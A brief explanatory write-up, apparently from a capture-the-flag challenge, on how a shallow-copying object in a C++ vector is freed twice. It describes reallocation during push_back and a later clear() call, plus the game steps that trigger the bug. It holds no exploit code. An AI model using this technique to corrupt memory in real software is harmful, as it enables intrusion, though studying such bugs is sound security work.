The implementation of vector::push_back.

Almost everyone know that when we use the vector::push_back(object) function, it will call the copy constructor , which is a shallow copy.  And if there is a resource deletion in the destrutor and  we  delete the the object  and use vector::clear(), it will cause a double free.

But if you go through the code , you will find only the vector::clear() funtion, there is not another object deletion.(in the program the object is created by ```new``` operation so need to be delete by ```delete``` operation )

Many one ignore the impelmentation of expending capacity of vector. While expending the capacity , the vector will first use the copy constructor to create new object and then use destrutor to delete the original one. This is another resource releasion.

So  we need to pass the first level of the game , and the first level will be pushed into the vector. And if we quit in the second level, in order to expend the capaciity , the first level will be copyed and deleted. And while calling the vector::clear() , the first level will be deleted aggin.
